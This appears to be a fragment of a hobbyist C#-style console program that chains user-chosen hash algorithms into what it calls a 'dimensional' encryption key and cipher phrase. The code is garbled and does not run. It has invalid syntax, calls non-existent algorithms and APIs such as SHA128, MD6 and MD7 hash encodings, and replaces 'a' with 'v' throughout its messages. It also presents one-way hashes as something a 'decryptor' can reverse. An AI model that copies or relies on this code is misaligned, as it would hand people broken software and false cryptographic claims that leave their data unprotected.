																						System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																						public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																						public Byte[] _cipherByteBase = _cipherUt.Base64();

																						_encoCiphHash(_cipherByteBase){

																							public Hash _hashsec512 = new Hash(_cipherByteBase);
																							public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																							return _shvfunc;

																						}
																						else if(_codexstring[1] == "f"){
																							System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																							public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																							public Byte[] _cipherByteBase = _cipherUt.Base64();

																							_encoCiphHash(_cipherByteBase){

																								public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																								public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																								return _shvfunc;

																							}
																							else if(_codexstring[1] == "G"){
																								System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																								public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																								public Byte[] _cipherByteBase = _cipherUt.Base64();

																								_encoCiphHash(_cipherByteBase){

																									public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																									public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																									return _shvfunc;

																								}
																								else if(_codexstring[1] == "z"){
																									System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																									public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																									public Byte[] _cipherByteBase = _cipherUt.Base64();

																									_encoCiphHash(_cipherByteBase){

																										public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																										public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																										return _shvfunc;

																									}
																									else{

																										System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																									}



														}
																								for(_codexstring[2]){

																									if(_codexstring[2] == "c"){
																										System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																										public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																										public Byte[] _cipherByteBase = _cipherUt.Base64();

																										_encoCiphHash(_cipherByteBase){

																											public Hash _hashsec128 = new Hash(_cipherByteBase);
																											public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																											return _shvfunc;

																										}

																									}

																									else if(_codexstring[2] == "d"){
																										System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																										public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																										public Byte[] _cipherByteBase = _cipherUt.Base64();

																										_encoCiphHash(_cipherByteBase){

																											public Hash _hashsec256 = new Hash(_cipherByteBase);
																											public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																											return _shvfunc;

																										}
																										else if(_codexstring[2] == "e"){
																											System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																											public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																											public Byte[] _cipherByteBase = _cipherUt.Base64();

																											_encoCiphHash(_cipherByteBase){

																												public Hash _hashsec512 = new Hash(_cipherByteBase);
																												public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																												return _shvfunc;

																											}
																											else if(_codexstring[2] == "f"){
																												System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																												public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																												public Byte[] _cipherByteBase = _cipherUt.Base64();

																												_encoCiphHash(_cipherByteBase){

																													public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																													public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																													return _shvfunc;

																												}
																												else if(_codexstring[2] == "G"){
																													System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																													public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																													public Byte[] _cipherByteBase = _cipherUt.Base64();

																													_encoCiphHash(_cipherByteBase){

																														public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																														public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																														return _shvfunc;

																													}
																													else if(_codexstring[2] == "z"){
																														System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																														public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																														public Byte[] _cipherByteBase = _cipherUt.Base64();

																														_encoCiphHash(_cipherByteBase){

																															public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																															public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																															return _shvfunc;

																														}
																														else{

																															System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																														}
														}
																													for(_codexstring[3]){

																														if(_codexstring[3] == "c"){
																															System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																															public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																															public Byte[] _cipherByteBase = _cipherUt.Base64();

																															_encoCiphHash(_cipherByteBase){

																																public Hash _hashsec128 = new Hash(_cipherByteBase);
																																public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																return _shvfunc;

																															}

																														}

																														else if(_codexstring[3] == "d"){
																															System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																															public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																															public Byte[] _cipherByteBase = _cipherUt.Base64();

																															_encoCiphHash(_cipherByteBase){

																																public Hash _hashsec256 = new Hash(_cipherByteBase);
																																public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																return _shvfunc;

																															}
																															else if(_codexstring[3] == "e"){
																																System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																public Byte[] _cipherByteBase = _cipherUt.Base64();

																																_encoCiphHash(_cipherByteBase){

																																	public Hash _hashsec512 = new Hash(_cipherByteBase);
																																	public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																	return _shvfunc;

																																}
																																else if(_codexstring[3] == "f"){
																																	System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																	public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																	public Byte[] _cipherByteBase = _cipherUt.Base64();

																																	_encoCiphHash(_cipherByteBase){

																																		public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																		public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																		return _shvfunc;

																																	}
																																	else if(_codexstring[3] == "G"){
																																		System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																		public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																		public Byte[] _cipherByteBase = _cipherUt.Base64();

																																		_encoCiphHash(_cipherByteBase){

																																			public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																			public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																			return _shvfunc;

																																		}
																																		else if(_codexstring[3] == "z"){
																																			System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																			public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																			public Byte[] _cipherByteBase = _cipherUt.Base64();

																																			_encoCiphHash(_cipherByteBase){

																																				public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																				public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																				return _shvfunc;

																																			}
																																			else{

																																				System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																			}

														}
																																		for(_codexstring[4]){

																																			if(_codexstring[4] == "c"){
																																				System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																				public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																				public Byte[] _cipherByteBase = _cipherUt.Base64();

																																				_encoCiphHash(_cipherByteBase){

																																					public Hash _hashsec128 = new Hash(_cipherByteBase);
																																					public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																					return _shvfunc;

																																				}

																																			}

																																			else if(_codexstring[4] == "d"){
																																				System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																				public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																				public Byte[] _cipherByteBase = _cipherUt.Base64();

																																				_encoCiphHash(_cipherByteBase){

																																					public Hash _hashsec256 = new Hash(_cipherByteBase);
																																					public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																					return _shvfunc;

																																				}
																																				else if(_codexstring[4] == "e"){
																																					System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																					public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																					public Byte[] _cipherByteBase = _cipherUt.Base64();

																																					_encoCiphHash(_cipherByteBase){

																																						public Hash _hashsec512 = new Hash(_cipherByteBase);
																																						public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																						return _shvfunc;

																																					}
																																					else if(_codexstring[4] == "f"){
																																						System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																						public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																						public Byte[] _cipherByteBase = _cipherUt.Base64();

																																						_encoCiphHash(_cipherByteBase){

																																							public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																							public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																							return _shvfunc;

																																						}
																																						else if(_codexstring[4] == "G"){
																																							System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																							public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																							public Byte[] _cipherByteBase = _cipherUt.Base64();

																																							_encoCiphHash(_cipherByteBase){

																																								public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																								public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																								return _shvfunc;

																																							}
																																							else if(_codexstring[4] == "z"){
																																								System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																								public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																								public Byte[] _cipherByteBase = _cipherUt.Base64();

																																								_encoCiphHash(_cipherByteBase){

																																									public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																									public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																									return _shvfunc;

																																								}
																																								else{

																																									System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																								}

														}
																																							for(_codexstring[5]){

																																								if(_codexstring[5] == "c"){
																																									System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																									public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																									public Byte[] _cipherByteBase = _cipherUt.Base64();

																																									_encoCiphHash(_cipherByteBase){

																																										public Hash _hashsec128 = new Hash(_cipherByteBase);
																																										public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																										return _shvfunc;

																																									}

																																								}

																																								else if(_codexstring[5] == "d"){
																																									System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																									public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																									public Byte[] _cipherByteBase = _cipherUt.Base64();

																																									_encoCiphHash(_cipherByteBase){

																																										public Hash _hashsec256 = new Hash(_cipherByteBase);
																																										public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																										return _shvfunc;

																																									}
																																									else if(_codexstring[5] == "e"){
																																										System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																										public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																										public Byte[] _cipherByteBase = _cipherUt.Base64();

																																										_encoCiphHash(_cipherByteBase){

																																											public Hash _hashsec512 = new Hash(_cipherByteBase);
																																											public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																											return _shvfunc;

																																										}
																																										else if(_codexstring[5] == "f"){
																																											System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																											public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																											public Byte[] _cipherByteBase = _cipherUt.Base64();

																																											_encoCiphHash(_cipherByteBase){

																																												public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																												public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																												return _shvfunc;

																																											}
																																											else if(_codexstring[5] == "G"){
																																												System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																												public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																												public Byte[] _cipherByteBase = _cipherUt.Base64();

																																												_encoCiphHash(_cipherByteBase){

																																													public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																													public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																													return _shvfunc;

																																												}
																																												else if(_codexstring[5] == "z"){
																																													System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																													public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																													public Byte[] _cipherByteBase = _cipherUt.Base64();

																																													_encoCiphHash(_cipherByteBase){

																																														public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																														public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																														return _shvfunc;

																																													}
																																													else{

																																														System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																													}
																																												}
																																												for(_codexstring[6]){

																																													if(_codexstring[6] == "c"){
																																														System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																														public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																														public Byte[] _cipherByteBase = _cipherUt.Base64();

																																														_encoCiphHash(_cipherByteBase){

																																															public Hash _hashsec128 = new Hash(_cipherByteBase);
																																															public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																															return _shvfunc;

																																														}

																																													}

																																													else if(_codexstring[6] == "d"){
																																														System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																														public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																														public Byte[] _cipherByteBase = _cipherUt.Base64();

																																														_encoCiphHash(_cipherByteBase){

																																															public Hash _hashsec256 = new Hash(_cipherByteBase);
																																															public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																															return _shvfunc;

																																														}
																																														else if(_codexstring[6] == "e"){
																																															System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																															public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																															public Byte[] _cipherByteBase = _cipherUt.Base64();

																																															_encoCiphHash(_cipherByteBase){

																																																public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																																return _shvfunc;

																																															}
																																															else if(_codexstring[6] == "f"){
																																																System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																_encoCiphHash(_cipherByteBase){

																																																	public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																	public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																																	return _shvfunc;

																																																}
																																																else if(_codexstring[6] == "G"){
																																																	System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																	public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																	public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																	_encoCiphHash(_cipherByteBase){

																																																		public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																		public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																																		return _shvfunc;

																																																	}
																																																	else if(_codexstring[6] == "z"){
																																																		System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																		public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																		public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																		_encoCiphHash(_cipherByteBase){

																																																			public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																			public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																																			return _shvfunc;

																																																		}
																																																		else{

																																																			System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																		}



														}
																																																	for(_codexstring[7]){

																																																		if(_codexstring[7] == "c"){
																																																			System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																			public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																			public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																			_encoCiphHash(_cipherByteBase){

																																																				public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																				public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																																				return _shvfunc;

																																																			}

																																																		}

																																																		else if(_codexstring[7] == "d"){
																																																			System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																			public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																			public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																			_encoCiphHash(_cipherByteBase){

																																																				public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																				public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																																				return _shvfunc;

																																																			}
																																																			else if(_codexstring[7] == "e"){
																																																				System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																				public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																				public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																				_encoCiphHash(_cipherByteBase){

																																																					public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																					public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																																					return _shvfunc;

																																																				}
																																																				else if(_codexstring[7] == "f"){
																																																					System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																					public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																					public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																					_encoCiphHash(_cipherByteBase){

																																																						public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																						public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																																						return _shvfunc;

																																																					}
																																																					else if(_codexstring[7] == "G"){
																																																						System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																						public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																						public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																						_encoCiphHash(_cipherByteBase){

																																																							public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																							public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																																							return _shvfunc;

																																																						}
																																																						else if(_codexstring[7] == "z"){
																																																							System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																							public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																							public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																							_encoCiphHash(_cipherByteBase){

																																																								public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																								public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																																								return _shvfunc;

																																																							}
																																																							else{

																																																								System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																							}



														}
																																																						for(_codexstring[8]){

																																																							if(_codexstring[8] == "c"){
																																																								System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																								public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																								public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																								_encoCiphHash(_cipherByteBase){

																																																									public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																									public SHA128 _shvfunc2 = _hashsec128.ToEncoding(SHA128);
																																																									return _shvfunc2;

																																																								}

																																																							}

																																																							else if(_codexstring[8] == "d"){
																																																								System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																								public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																								public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																								_encoCiphHash(_cipherByteBase){

																																																									public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																									public SHA256 _shvfunc2 = _hashsec256.ToEncoding(SHA256);
																																																									return _shvfunc2;

																																																								}
																																																								else if(_codexstring[8] == "e"){
																																																									System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																									public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																									public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																									_encoCiphHash(_cipherByteBase){

																																																										public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																										public SHA512 _shvfunc2 = _hashsec512.ToEncoding(SHA512);
																																																										return _shvfunc2;

																																																									}
																																																									else if(_codexstring[8] == "f"){
																																																										System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																										public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																										public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																										_encoCiphHash(_cipherByteBase){

																																																											public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																											public MD5 _shvfunc2 = _hashsecMD5.ToEncoding(MD5);
																																																											return _shvfunc2;

																																																										}
																																																										else if(_codexstring[8] == "G"){
																																																											System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																											public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																											public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																											_encoCiphHash(_cipherByteBase){

																																																												public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																												public MD6 _shvfunc2 = _hashsecMD6.ToEncoding(MD6);
																																																												return _shvfunc2;

																																																											}
																																																											else if(_codexstring[8] == "z"){
																																																												System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																												public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																												public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																												_encoCiphHash(_cipherByteBase){

																																																													public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																													public MD7 _shvfunc2 = _hashsecMD7.ToEncoding(MD7);
																																																													return _shvfunc2;

																																																												}
																																																												else{

																																																													System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																												}

														}



																																																											System.Console.WriteLine("Your Vlgorithed PvssKey Text Comes Out In The 8-1 Dimensionvl Vlgorithm Chosen To :");
																																																											System.Console.WriteLine(_shvfunc.ToString());
																																																											System.Console.WriteLine("Plevse Remember The Following Cipher Phrvse For Decryptor Use: " + _shvfunc2.ToString() + "Vnd Do Not Forget To Include The 8:1 Descriptor For Effective Decryption! ");
																																																											System.Console.WriteLine("Your Key Encoding Will Vlso Need To Be Retvined To Be Used For Decryption So If You Chose SHV128, SHV256, SHV512, MD5/6/or 7, Plevse Shvre Thvt To The Other Pvrty Involved ");
																																																											System.Console.WriteLine("In V Privvte Vnd Encrypted Communicvtion Method, However Mvintvin Covervge With PGP, One-Time KeyPhrvse Or Miscellvnious For Vplivble Security In Messvging The Determined Key Encoding.");
																																																											System.Console.WriteLine("Plevse Enjoy The Vlgorithm Vnd Stvy Protected!  - Nvye");
																																																											System.Console.ReadLine();


	

													else if(_vlgoDecise == "6-3" ){


																																																												System.Console.WriteLine("Hvving Chosen The 6-3 Dimensionvl Vlgorithmic Hvshing Function V Word Is In Order... ");
																																																												System.Console.WriteLine("");
																																																												System.Console.WriteLine("For The Dimension Listed Within The First Vvrivble, The Choice Of Specific Vlgorithms Will Be Mvde, ");
																																																												System.Console.WriteLine("Vfter Which The Choice Of Key Encryption, Listed Vs The Second Vvrivble Will Be Determined, Subsequently ");
																																																												System.Console.WriteLine("The Lvst Leg of The Encryption Bvse Will Provide The Room For The Messvge For Cryptogrvphic Cipher Crevtion.");
																																																												System.Console.WriteLine(" ");
																																																												System.Console.WriteLine("First, Plevse Choose The Vlgorithm For Section One of The Hvshing Function: ");
																																																												System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																												string array[] _commCrypto = new array["SHA128" , "SHA256" , "SHA512" , "MD5" , "MD6" , "MD7"];

																																																												string _inputDecision = System.Console.ReadLine();
																																																												System.Console.WriteLine("Plevse Choose The Vlgorithm For Section Two of The Hvshing Function: ");
																																																												System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																												string _inputDecision2 = System.Console.ReadLine();
																																																												System.Console.WriteLine("Plevse Choose The Vlgorithm For Section Three of The Hvshing Function: ");
																																																												System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																												string _inputDecision3 = System.Console.ReadLine();
																																																												System.Console.WriteLine("Plevse Choose The Vlgorithm For Section Four of The Hvshing Function: ");
																																																												System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																												string _inputDecision4 = System.Console.ReadLine();
																																																												System.Console.WriteLine("Plevse Choose The Vlgorithm For Section Five of The Hvshing Function: ");
																																																												System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																												string _inputDecision5 = System.Console.ReadLine();
																																																												System.Console.WriteLine("Plevse Choose The Vlgorithm For Section Six of The Hvshing Function: ");
																																																												System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																												string _inputDecision6 = System.Console.ReadLine();
																																																												System.Console.WriteLine("Plevse Choose The Vlgorithm For The First Key Section of The Hvshing Function: ");
																																																												System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																												string _inputDecision7 = System.Console.ReadLine();
																																																												System.Console.WriteLine("Plevse Choose The Vlgorithm For The Second Key Section of The Hvshing Function: ");
																																																												System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																												string _inputDecision8 = System.Console.ReadLine();
																																																												System.Console.WriteLine("Plevse Choose The Vlgorithm For The Third Key Section of The Hvshing Function: ");
																																																												System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																												string _inputDecision9 = System.Console.ReadLine();

																																																												public array[:] _diarrayEya = new array["SHV128" : "11" , "SHV256" : "12" , "SHV512" : "13" , "MD5" : "14" , "MD6" : "15" , "MD7" : "16"];

																																																												public int _int1 = _commCrypto.IndexOf("SHA128");
																																																												public int _int2 = _commCrypto.IndexOf("SHA256");
																																																												public int _int3 = _commCrypto.IndexOf("SHA512");
																																																												public int _int4 = _commCrypto.IndexOf("MD5");
																																																												public int _int5 = _commCrypto.IndexOf("MD6");
																																																												public int _int6 = _commCrypto.IndexOf("MD7");
																																																												public string _codexstring = "";
																																																												if(_inputDecision == _int1 || _inputDecision2 == _int1 || _inputDecision3 == _int1 || _inputDecision4 == _int1 || _inputDecision5 == _int1 || _inputDecision6 == _int1 || _inputDecision7 == _int1 || _inputDecision8 == _int1 ||
																																																													_inputDecision9 == _int1){

																																																													string array[] _disArray = new array["0" , "0" , "0" , "0" , "0" , "0" , "0" , "0", "0" , "0" , "0" , "0" , "9" ];
																																																													string _part1 = _disarrayEya[0];
																																																													public bool _boolIT = new bool(,);
																																																													if(_boolIT(_inputDecision  , _int1) == true){

																																																														_disArray.Ammend[string "c" : 0];


																																																													}
																																																													else if(_boolIT(_inputDecision2, _int1) == true){

																																																														_disArray.Ammend[string "c" : 1];


																																																													}
																																																													else if(_boolIT(_inputDecision3 , _int1) == true){


																																																														_disArray.Ammend[string "c" : 2];

																																																													}
																																																													else if(_boolIT(_inputDecision4 , _int1) == true){

																																																														_disArray.Ammend[string "c" : 3];

																																																													}
																																																													else if(_boolIT(_inputDecision5 , _int1) == true){

																																																														_disArray.Ammend[string "c" : 4];
																																																													}
																																																													else if(_boolIT(_inputDecision6 , _int1) == true){

																																																														_disArray.Ammend[string "c" : 5];

																																																													}
																																																													else if(_boolIT(_inputDecision7 , _int1) == true){

																																																														_disArray.Ammend[string "c" : 6];

																																																													}
																																																													else if(_boolIT(_inputDecision8 , _int1) == true){

																																																														_disArray.Ammend[string "c" : 7];

																																																													}
																																																													else if(_boolIT(_inputDecision9 , _int1) == true){

																																																														_disArray.Ammend[string "c" : 8];

																																																													}
																																																													else{
																																																														System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");



																																																													}


																																																												}
																																																												else if(_inputDecision == _int2 || _inputDecision2 == _int2 || _inputDecision3 == _int2 || _inputDecision4 == _int2 || _inputDecision5 == _int2 || _inputDecision6 == _int2 || _inputDecision7 == _int2 || _inputDecision8 == _int2 ||
																																																													_inputDecision9 == _int2){

																																																													string _part1 = _disarrayEya[0];
																																																													string array[] _disArray = new array["0" , "0" , "0" , "0" , "0" , "0" , "0" , "0", "0" , "0" , "0" , "0" , "9" ];
																																																													public bool _boolIT = new bool(,);
																																																													if(_boolIT(_inputDecision  , _int2) == true){

																																																														_disArray.Ammend[string "d" : 0];


																																																													}
